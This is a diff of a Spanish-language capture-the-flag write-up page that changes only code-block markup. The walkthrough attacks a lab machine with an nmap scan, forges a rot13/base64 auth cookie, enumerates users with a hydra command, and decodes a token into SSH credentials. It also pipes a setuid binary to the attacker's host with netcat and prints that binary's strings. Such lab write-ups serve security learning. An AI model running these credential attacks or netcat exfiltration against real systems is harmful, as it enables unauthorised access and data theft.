@@ -44,38 +44,38 @@ IP Victima: 10.0.12.26</p><h2 id=2-servicios>2. Servicios</h2><div class=highlig
 </span></span></span><span class=line><span class=cl><span class=s2>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span></span><span class=line><span class=cl><span class=s2>Nmap done: 1 IP address (1 host up) scanned in 190.10 seconds
 </span></span></span></code></pre></div><h2 id=3-enumeración-web>3. Enumeración Web</h2><p>Tenemos una pagina principal que nos pide credenciales para acceder, podemos usar <code>guest:guest</code>.
-Dentro no hay gran cosa, pero obtenemos una cookie en b64 <code>auth:""Z3Vlc3Q6dGhyZmc=""</code> si lo descodificamos obtenemos <code>guest:thrfg</code>, sabiendo que las credenciales son <code>guest:guest</code> podemos asumir que la cookie es <code>guest:guest</code>, solo que cifrada usando <code>rot13</code>.</p><p>Lanzamos <code>dirb http://10.0.12.26:8080/</code> y encontramos la ruta <code>/admin</code> que nos lleva a un panel de login.</p><p>Para conseguir acceder al panel de admin, podemos usar <code>guest:guest</code> y en la cookie <code>auth</code> poner <code>admin:admin</code> cifrado en rot13.</p><p>Intentamos crear una cookie con el valor adecuado:</p><pre tabindex=0><code>admin:admin &gt; admin:nqzva &gt; YWRtaW46bnF6dmE=
-</code></pre><p>Pero no funciona :(</p><p>Deberemos buscar otra forma de acceder al panel de admin.</p><p>Vamos a intentar sacar usuarios con <code>hydra</code> usando la password por defecto <code>guest</code> y el mensaje de error que inyecta en la página cuando el usuario no es correcto, <code>Invalid username.</code>.</p><pre tabindex=0><code>hydra -L ~/Descargas/usernames.txt -p guest -s 8080 10.0.12.26 http-post-form &#34;/:username=^USER^&amp;password=^PASS^:Invalid username.&#34;
-</code></pre><p>Encontramos los siguientes usuarios:</p><pre tabindex=0><code>[8080][http-post-form] host: 10.0.12.26   login: guest   password: guest
-[8080][http-post-form] host: 10.0.12.26   login: magellan   password: guest
-[8080][http-post-form] host: 10.0.12.26   login: venus   password: guest
-</code></pre><p>Iniciamos sesion con <code>magellan:guest</code> y miramos su token: <code>"bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ=="</code> que descodificamos a <code>magellan:irahfvnatrbybtl1989</code>, tras pasar por rot13 tendriamos: <code>magellan:venusiangeology1989</code>.</p><p>Intentamos iniciar sesion ssh con las credenciales:</p><pre tabindex=0><code>datadiego@~ ssh magellan@10.0.12.26 -p 22
-magellan@10.0.12.26&#39;s password: 
-Last failed login: Fri Feb 21 15:59:31 GMT 2025 from 10.0.12.25 on ssh:notty
-There were 2 failed login attempts since the last successful login.
-[magellan@venus ~]$ whoami
-magellan
-</code></pre><p>Funciona!</p><h2 id=4-escalada-de-privilegios>4. Escalada de privilegios</h2><p>Volvemos a usar el comando de la anterior maquina de la serie <code>find / -perm -u=s -type f 2>/dev/null</code></p><p>Encontramos varios binarios con permisos de setuid:</p><pre tabindex=0><code>[magellan@venus ~]$ find / -perm -u=s -type f 2&gt;/dev/null
-/usr/bin/chage
-/usr/bin/gpasswd
-/usr/bin/newgrp
-/usr/bin/mount
-/usr/bin/pkexec
-/usr/bin/su
-/usr/bin/umount
-/usr/bin/crontab
-/usr/bin/sudo
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/chsh
-/usr/bin/at
-/usr/sbin/grub2-set-bootflag
-/usr/sbin/pam_timestamp_check
-/usr/sbin/unix_chkpwd
-/usr/sbin/mount.nfs
-/usr/lib/polkit-1/polkit-agent-helper-1
-/usr/libexec/cockpit-session
-</code></pre><p>Vamos a intentar usar <code>pkexec</code> para ejecutar comandos como root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>magellan@venus ~<span class=o>]</span>$ <span class=nv>pkexec</span> 
+Dentro no hay gran cosa, pero obtenemos una cookie en b64 <code>auth:""Z3Vlc3Q6dGhyZmc=""</code> si lo descodificamos obtenemos <code>guest:thrfg</code>, sabiendo que las credenciales son <code>guest:guest</code> podemos asumir que la cookie es <code>guest:guest</code>, solo que cifrada usando <code>rot13</code>.</p><p>Lanzamos <code>dirb http://10.0.12.26:8080/</code> y encontramos la ruta <code>/admin</code> que nos lleva a un panel de login.</p><p>Para conseguir acceder al panel de admin, podemos usar <code>guest:guest</code> y en la cookie <code>auth</code> poner <code>admin:admin</code> cifrado en rot13.</p><p>Intentamos crear una cookie con el valor adecuado:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin:admin &gt; admin:nqzva &gt; YWRtaW46bnF6dmE=
+</span></span></code></pre></div><p>Pero no funciona :(</p><p>Deberemos buscar otra forma de acceder al panel de admin.</p><p>Vamos a intentar sacar usuarios con <code>hydra</code> usando la password por defecto <code>guest</code> y el mensaje de error que inyecta en la página cuando el usuario no es correcto, <code>Invalid username.</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hydra -L ~/Descargas/usernames.txt -p guest -s 8080 10.0.12.26 http-post-form &#34;/:username=^USER^&amp;password=^PASS^:Invalid username.&#34;
+</span></span></code></pre></div><p>Encontramos los siguientes usuarios:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[8080][http-post-form] host: 10.0.12.26   login: guest   password: guest
+</span></span><span class=line><span class=cl>[8080][http-post-form] host: 10.0.12.26   login: magellan   password: guest
+</span></span><span class=line><span class=cl>[8080][http-post-form] host: 10.0.12.26   login: venus   password: guest
+</span></span></code></pre></div><p>Iniciamos sesion con <code>magellan:guest</code> y miramos su token: <code>"bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ=="</code> que descodificamos a <code>magellan:irahfvnatrbybtl1989</code>, tras pasar por rot13 tendriamos: <code>magellan:venusiangeology1989</code>.</p><p>Intentamos iniciar sesion ssh con las credenciales:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>datadiego@~ ssh magellan@10.0.12.26 -p 22
+</span></span><span class=line><span class=cl>magellan@10.0.12.26&#39;s password: 
+</span></span><span class=line><span class=cl>Last failed login: Fri Feb 21 15:59:31 GMT 2025 from 10.0.12.25 on ssh:notty
+</span></span><span class=line><span class=cl>There were 2 failed login attempts since the last successful login.
+</span></span><span class=line><span class=cl>[magellan@venus ~]$ whoami
+</span></span><span class=line><span class=cl>magellan
+</span></span></code></pre></div><p>Funciona!</p><h2 id=4-escalada-de-privilegios>4. Escalada de privilegios</h2><p>Volvemos a usar el comando de la anterior maquina de la serie <code>find / -perm -u=s -type f 2>/dev/null</code></p><p>Encontramos varios binarios con permisos de setuid:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[magellan@venus ~]$ find / -perm -u=s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/bin/chage
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/bin/mount
+</span></span><span class=line><span class=cl>/usr/bin/pkexec
+</span></span><span class=line><span class=cl>/usr/bin/su
+</span></span><span class=line><span class=cl>/usr/bin/umount
+</span></span><span class=line><span class=cl>/usr/bin/crontab
+</span></span><span class=line><span class=cl>/usr/bin/sudo
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/at
+</span></span><span class=line><span class=cl>/usr/sbin/grub2-set-bootflag
+</span></span><span class=line><span class=cl>/usr/sbin/pam_timestamp_check
+</span></span><span class=line><span class=cl>/usr/sbin/unix_chkpwd
+</span></span><span class=line><span class=cl>/usr/sbin/mount.nfs
+</span></span><span class=line><span class=cl>/usr/lib/polkit-1/polkit-agent-helper-1
+</span></span><span class=line><span class=cl>/usr/libexec/cockpit-session
+</span></span></code></pre></div><p>Vamos a intentar usar <code>pkexec</code> para ejecutar comandos como root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>magellan@venus ~<span class=o>]</span>$ <span class=nv>pkexec</span> 
 </span></span><span class=line><span class=cl><span class=o>====</span> AUTHENTICATING FOR org.freedesktop.policykit.exec <span class=o>====</span>
 </span></span><span class=line><span class=cl>Authentication is needed to run <span class=sb>`</span>/bin/bash<span class=err>&#39;</span> as the super user
 </span></span><span class=line><span class=cl>Authenticating as: root
@@ -88,174 +88,174 @@ magellan
 </span></span><span class=line><span class=cl><span class=o>[</span>magellan@venus ~<span class=o>]</span>$ 
 </span></span></code></pre></div><p>Parece que espera argumentos, si mandamos 1234, la consola se queda colgada.</p><p>Vamos a descargar el binario para analizarlo en nuestra maquina con nc:</p><p>En la maquina atacante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>datadiego@~ nc -lvp <span class=m>8888</span> &gt; polkit-agent-helper-1
 </span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>8888</span>
-</span></span></code></pre></div><p>En la maquina victima:</p><pre tabindex=0><code>[magellan@venus polkit-1]$ cat polkit-agent-helper-1 | nc 10.0.12.25 8888
-</code></pre><h2 id=analisis-del-binario>Analisis del binario</h2><h3 id=strings>strings</h3><pre tabindex=0><code>/lib64/ld-linux-x86-64.so.2
-&amp;*iE
-_ITM_deregisterTMCloneTable
-__gmon_start__
-_ITM_registerTMCloneTable
-__cxa_finalize
-__libc_start_main
-g_strdup
-strlen
-stdout
-__fprintf_chk
-g_strescape
-fputs
-fputc
-fflush
-g_free
-calloc
-stdin
-fgets
-memset
-__stack_chk_fail
-__getdelim
-g_strchomp
-feof
-perror
-polkit_authority_get_sync
-polkit_unix_user_new_for_name
-polkit_authority_authentication_agent_response_sync
-g_object_unref
-g_printerr
-g_error_free
-stderr
-fileno
-fdatasync
-usleep
-pam_end
-fwrite
-setenv
-geteuid
-openlog
-getuid
-isatty
-pam_start
-pam_set_item
-pam_authenticate
-pam_acct_mgmt
-pam_get_item
-strcmp
-__syslog_chk
-g_strdup_printf
-pam_strerror
-libpam.so.0
-libpolkit-gobject-1.so.0
-libgobject-2.0.so.0
-libglib-2.0.so.0
-libc.so.6
-__libc_csu_fini
-flush_and_wait
-_IO_stdin_used
-__data_start
-send_dbus_message
-__libc_csu_init
-__bss_start
-read_cookie
-_edata
-_polkit_clearenv
-LIBPAM_1.0
-GLIBC_2.4
-GLIBC_2.3.4
-GLIBC_2.2.5
-AVAUA
-D$(1
-toE1
-D$(dH+
-[]A\A]A^
-u+UH
-ATUSH
-[]A\A]
-AWHc
-AVAUATI
-[]A\A]A^A_
-AUATI
-[]A\A]A^
-[]A\A]A^A_
-PAM_PROMPT_ECHO_OFF
-PAM_PROMPT_ECHO_ON
-PAM_ERROR_MSG
-PAM_TEXT_INFO
-getline
-Error getting authority: %s
-/usr/sbin:/usr/bin:/sbin:/bin
-PATH
-polkit-agent-helper-1
-polkit-1
-SUCCESS
-FAILURE
-Error constructing identity: %s
-polkit-agent-helper-1: error response to PolicyKit daemon: %s
-polkit-agent-helper-1: needs to be setuid root
-Incorrect permissions on %s (needs to be setuid root)
-inappropriate use of helper, wrong number of arguments [uid=%d]
-polkit-agent-helper-1: wrong number of arguments. This incident has been logged.
-inappropriate use of helper, stdin is a tty [uid=%d]
-polkit-agent-helper-1: inappropriate use of helper, stdin is a tty. This incident has been logged.
-polkit-agent-helper-1: pam_start failed: %s
-polkit-agent-helper-1: pam_set_item failed: %s
-polkit-agent-helper-1: pam_authenticate failed: %s
-polkit-agent-helper-1: pam_acct_mgmt failed: %s
-polkit-agent-helper-1: pam_get_item failed: %s
-polkit-agent-helper-1: Tried to auth user &#39;%s&#39; but we got auth for user &#39;%s&#39; instead
-:*3$&#34;
-3g958
-annobin gcc 11.0.0 20210116
-running gcc 11.0.0 20210123
-GA*FORTIFY
-GA+GLIBCXX_ASSERTIONS
-GA*GOW
-GA*cf_protection
-GA+omit_frame_pointer
-GA+stack_clash
-GA!stack_realign
-GA*FORTIFY
-GA+GLIBCXX_ASSERTIONS
-GA*cf_protection
-polkit-agent-helper-1-0.117-3.fc34.x86_64.debug
-7zXZ
-6F;$m
-++iyk
-A&#39;_	!
-hJ	B
-x%Xq
-tUQw\^U
-sH}cHXqY
-&gt;rvH
-Jm%itu
-P4{@
-{4$&gt;Vw!
-.shstrtab
-.interp
-.note.gnu.property
-.note.gnu.build-id
-.note.ABI-tag
-.gnu.hash
-.dynsym
-.dynstr
-.gnu.version
-.gnu.version_r
-.rela.dyn
-.rela.plt
-.init
-.plt.sec
-.text
-.fini
-.rodata
-.eh_frame_hdr
-.eh_frame
-.init_array
-.fini_array
-.data.rel.ro
-.dynamic
-.got
-.data
-.bss
-.gnu.build.attributes
-.gnu_debuglink
-.gnu_debugdata
-</code></pre><h3 id=ltrace>ltrace</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>datadiego@~ chmod +x polkit-agent-helper-1 
+</span></span></code></pre></div><p>En la maquina victima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[magellan@venus polkit-1]$ cat polkit-agent-helper-1 | nc 10.0.12.25 8888
+</span></span></code></pre></div><h2 id=analisis-del-binario>Analisis del binario</h2><h3 id=strings>strings</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=n>lib64</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>x86</span><span class=o>-</span><span class=mf>64.</span><span class=n>so</span><span class=o>.</span><span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=o>&amp;*</span><span class=n>iE</span>
+</span></span><span class=line><span class=cl><span class=n>_ITM_deregisterTMCloneTable</span>
+</span></span><span class=line><span class=cl><span class=n>__gmon_start__</span>
+</span></span><span class=line><span class=cl><span class=n>_ITM_registerTMCloneTable</span>
+</span></span><span class=line><span class=cl><span class=n>__cxa_finalize</span>
+</span></span><span class=line><span class=cl><span class=n>__libc_start_main</span>
+</span></span><span class=line><span class=cl><span class=n>g_strdup</span>
+</span></span><span class=line><span class=cl><span class=n>strlen</span>
+</span></span><span class=line><span class=cl><span class=n>stdout</span>
+</span></span><span class=line><span class=cl><span class=n>__fprintf_chk</span>
+</span></span><span class=line><span class=cl><span class=n>g_strescape</span>
+</span></span><span class=line><span class=cl><span class=n>fputs</span>
+</span></span><span class=line><span class=cl><span class=n>fputc</span>
+</span></span><span class=line><span class=cl><span class=n>fflush</span>
+</span></span><span class=line><span class=cl><span class=n>g_free</span>
+</span></span><span class=line><span class=cl><span class=n>calloc</span>
+</span></span><span class=line><span class=cl><span class=n>stdin</span>
+</span></span><span class=line><span class=cl><span class=n>fgets</span>
+</span></span><span class=line><span class=cl><span class=n>memset</span>
+</span></span><span class=line><span class=cl><span class=n>__stack_chk_fail</span>
+</span></span><span class=line><span class=cl><span class=n>__getdelim</span>
+</span></span><span class=line><span class=cl><span class=n>g_strchomp</span>
+</span></span><span class=line><span class=cl><span class=n>feof</span>
+</span></span><span class=line><span class=cl><span class=n>perror</span>
+</span></span><span class=line><span class=cl><span class=n>polkit_authority_get_sync</span>
+</span></span><span class=line><span class=cl><span class=n>polkit_unix_user_new_for_name</span>
+</span></span><span class=line><span class=cl><span class=n>polkit_authority_authentication_agent_response_sync</span>
+</span></span><span class=line><span class=cl><span class=n>g_object_unref</span>
+</span></span><span class=line><span class=cl><span class=n>g_printerr</span>
+</span></span><span class=line><span class=cl><span class=n>g_error_free</span>
+</span></span><span class=line><span class=cl><span class=n>stderr</span>
+</span></span><span class=line><span class=cl><span class=n>fileno</span>
+</span></span><span class=line><span class=cl><span class=n>fdatasync</span>
+</span></span><span class=line><span class=cl><span class=n>usleep</span>
+</span></span><span class=line><span class=cl><span class=n>pam_end</span>
+</span></span><span class=line><span class=cl><span class=n>fwrite</span>
+</span></span><span class=line><span class=cl><span class=n>setenv</span>
+</span></span><span class=line><span class=cl><span class=n>geteuid</span>
+</span></span><span class=line><span class=cl><span class=n>openlog</span>
+</span></span><span class=line><span class=cl><span class=n>getuid</span>
+</span></span><span class=line><span class=cl><span class=n>isatty</span>
+</span></span><span class=line><span class=cl><span class=n>pam_start</span>
+</span></span><span class=line><span class=cl><span class=n>pam_set_item</span>
+</span></span><span class=line><span class=cl><span class=n>pam_authenticate</span>
+</span></span><span class=line><span class=cl><span class=n>pam_acct_mgmt</span>
+</span></span><span class=line><span class=cl><span class=n>pam_get_item</span>
+</span></span><span class=line><span class=cl><span class=n>strcmp</span>
+</span></span><span class=line><span class=cl><span class=n>__syslog_chk</span>
+</span></span><span class=line><span class=cl><span class=n>g_strdup_printf</span>
+</span></span><span class=line><span class=cl><span class=n>pam_strerror</span>
+</span></span><span class=line><span class=cl><span class=n>libpam</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>libpolkit</span><span class=o>-</span><span class=n>gobject</span><span class=o>-</span><span class=mf>1.</span><span class=n>so</span><span class=o>.</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>libgobject</span><span class=o>-</span><span class=mf>2.0</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>libglib</span><span class=o>-</span><span class=mf>2.0</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>6</span>
+</span></span><span class=line><span class=cl><span class=n>__libc_csu_fini</span>
+</span></span><span class=line><span class=cl><span class=n>flush_and_wait</span>
+</span></span><span class=line><span class=cl><span class=n>_IO_stdin_used</span>
+</span></span><span class=line><span class=cl><span class=n>__data_start</span>
+</span></span><span class=line><span class=cl><span class=n>send_dbus_message</span>
+</span></span><span class=line><span class=cl><span class=n>__libc_csu_init</span>
+</span></span><span class=line><span class=cl><span class=n>__bss_start</span>
+</span></span><span class=line><span class=cl><span class=n>read_cookie</span>
+</span></span><span class=line><span class=cl><span class=n>_edata</span>
+</span></span><span class=line><span class=cl><span class=n>_polkit_clearenv</span>
+</span></span><span class=line><span class=cl><span class=n>LIBPAM_1</span><span class=o>.</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>GLIBC_2</span><span class=o>.</span><span class=mi>4</span>
+</span></span><span class=line><span class=cl><span class=n>GLIBC_2</span><span class=o>.</span><span class=mf>3.4</span>
+</span></span><span class=line><span class=cl><span class=n>GLIBC_2</span><span class=o>.</span><span class=mf>2.5</span>
+</span></span><span class=line><span class=cl><span class=n>AVAUA</span>
+</span></span><span class=line><span class=cl><span class=n>D</span><span class=o>$</span><span class=p>(</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>toE1</span>
+</span></span><span class=line><span class=cl><span class=n>D</span><span class=o>$</span><span class=p>(</span><span class=n>dH</span><span class=o>+</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=n>A</span>\<span class=n>A</span><span class=p>]</span><span class=n>A</span><span class=o>^</span>
+</span></span><span class=line><span class=cl><span class=n>u</span><span class=o>+</span><span class=n>UH</span>
+</span></span><span class=line><span class=cl><span class=n>ATUSH</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=n>A</span>\<span class=n>A</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>AWHc</span>
+</span></span><span class=line><span class=cl><span class=n>AVAUATI</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=n>A</span>\<span class=n>A</span><span class=p>]</span><span class=n>A</span><span class=o>^</span><span class=n>A_</span>
+</span></span><span class=line><span class=cl><span class=n>AUATI</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=n>A</span>\<span class=n>A</span><span class=p>]</span><span class=n>A</span><span class=o>^</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=n>A</span>\<span class=n>A</span><span class=p>]</span><span class=n>A</span><span class=o>^</span><span class=n>A_</span>
+</span></span><span class=line><span class=cl><span class=n>PAM_PROMPT_ECHO_OFF</span>
+</span></span><span class=line><span class=cl><span class=n>PAM_PROMPT_ECHO_ON</span>
+</span></span><span class=line><span class=cl><span class=n>PAM_ERROR_MSG</span>
+</span></span><span class=line><span class=cl><span class=n>PAM_TEXT_INFO</span>
+</span></span><span class=line><span class=cl><span class=n>getline</span>
+</span></span><span class=line><span class=cl><span class=n>Error</span> <span class=n>getting</span> <span class=n>authority</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span>
+</span></span><span class=line><span class=cl><span class=n>PATH</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>SUCCESS</span>
+</span></span><span class=line><span class=cl><span class=n>FAILURE</span>
+</span></span><span class=line><span class=cl><span class=n>Error</span> <span class=n>constructing</span> <span class=n>identity</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>error</span> <span class=n>response</span> <span class=n>to</span> <span class=n>PolicyKit</span> <span class=n>daemon</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>needs</span> <span class=n>to</span> <span class=n>be</span> <span class=n>setuid</span> <span class=n>root</span>
+</span></span><span class=line><span class=cl><span class=n>Incorrect</span> <span class=n>permissions</span> <span class=n>on</span> <span class=o>%</span><span class=n>s</span> <span class=p>(</span><span class=n>needs</span> <span class=n>to</span> <span class=n>be</span> <span class=n>setuid</span> <span class=n>root</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>inappropriate</span> <span class=n>use</span> <span class=n>of</span> <span class=n>helper</span><span class=p>,</span> <span class=n>wrong</span> <span class=n>number</span> <span class=n>of</span> <span class=n>arguments</span> <span class=p>[</span><span class=n>uid</span><span class=o>=%</span><span class=n>d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>wrong</span> <span class=n>number</span> <span class=n>of</span> <span class=n>arguments</span><span class=o>.</span> <span class=n>This</span> <span class=n>incident</span> <span class=n>has</span> <span class=n>been</span> <span class=n>logged</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>inappropriate</span> <span class=n>use</span> <span class=n>of</span> <span class=n>helper</span><span class=p>,</span> <span class=n>stdin</span> <span class=n>is</span> <span class=n>a</span> <span class=n>tty</span> <span class=p>[</span><span class=n>uid</span><span class=o>=%</span><span class=n>d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>inappropriate</span> <span class=n>use</span> <span class=n>of</span> <span class=n>helper</span><span class=p>,</span> <span class=n>stdin</span> <span class=n>is</span> <span class=n>a</span> <span class=n>tty</span><span class=o>.</span> <span class=n>This</span> <span class=n>incident</span> <span class=n>has</span> <span class=n>been</span> <span class=n>logged</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>pam_start</span> <span class=n>failed</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>pam_set_item</span> <span class=n>failed</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>pam_authenticate</span> <span class=n>failed</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>pam_acct_mgmt</span> <span class=n>failed</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>pam_get_item</span> <span class=n>failed</span><span class=p>:</span> <span class=o>%</span><span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=n>Tried</span> <span class=n>to</span> <span class=n>auth</span> <span class=n>user</span> <span class=s1>&#39;</span><span class=si>%s</span><span class=s1>&#39;</span> <span class=n>but</span> <span class=n>we</span> <span class=n>got</span> <span class=n>auth</span> <span class=k>for</span> <span class=n>user</span> <span class=s1>&#39;</span><span class=si>%s</span><span class=s1>&#39;</span> <span class=n>instead</span>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=o>*</span><span class=mi>3</span><span class=o>$</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=mi>3</span><span class=n>g958</span>
+</span></span><span class=line><span class=cl><span class=n>annobin</span> <span class=n>gcc</span> <span class=mf>11.0</span><span class=o>.</span><span class=mi>0</span> <span class=mi>20210116</span>
+</span></span><span class=line><span class=cl><span class=n>running</span> <span class=n>gcc</span> <span class=mf>11.0</span><span class=o>.</span><span class=mi>0</span> <span class=mi>20210123</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>*</span><span class=n>FORTIFY</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>+</span><span class=n>GLIBCXX_ASSERTIONS</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>*</span><span class=n>GOW</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>*</span><span class=n>cf_protection</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>+</span><span class=n>omit_frame_pointer</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>+</span><span class=n>stack_clash</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>!</span><span class=n>stack_realign</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>*</span><span class=n>FORTIFY</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>+</span><span class=n>GLIBCXX_ASSERTIONS</span>
+</span></span><span class=line><span class=cl><span class=n>GA</span><span class=o>*</span><span class=n>cf_protection</span>
+</span></span><span class=line><span class=cl><span class=n>polkit</span><span class=o>-</span><span class=n>agent</span><span class=o>-</span><span class=n>helper</span><span class=o>-</span><span class=mi>1</span><span class=o>-</span><span class=mf>0.117</span><span class=o>-</span><span class=mf>3.</span><span class=n>fc34</span><span class=o>.</span><span class=n>x86_64</span><span class=o>.</span><span class=n>debug</span>
+</span></span><span class=line><span class=cl><span class=mi>7</span><span class=n>zXZ</span>
+</span></span><span class=line><span class=cl><span class=mi>6</span><span class=n>F</span><span class=p>;</span><span class=o>$</span><span class=n>m</span>
+</span></span><span class=line><span class=cl><span class=o>++</span><span class=n>iyk</span>
+</span></span><span class=line><span class=cl><span class=n>A</span><span class=s1>&#39;_	!</span>
+</span></span><span class=line><span class=cl><span class=n>hJ</span>	<span class=n>B</span>
+</span></span><span class=line><span class=cl><span class=n>x</span><span class=o>%</span><span class=n>Xq</span>
+</span></span><span class=line><span class=cl><span class=n>tUQw</span>\<span class=o>^</span><span class=n>U</span>
+</span></span><span class=line><span class=cl><span class=n>sH</span><span class=p>}</span><span class=n>cHXqY</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;</span><span class=n>rvH</span>
+</span></span><span class=line><span class=cl><span class=n>Jm</span><span class=o>%</span><span class=n>itu</span>
+</span></span><span class=line><span class=cl><span class=n>P4</span><span class=p>{</span><span class=err>@</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=mi>4</span><span class=o>$&gt;</span><span class=n>Vw</span><span class=o>!</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>shstrtab</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>interp</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>note</span><span class=o>.</span><span class=n>gnu</span><span class=o>.</span><span class=n>property</span>
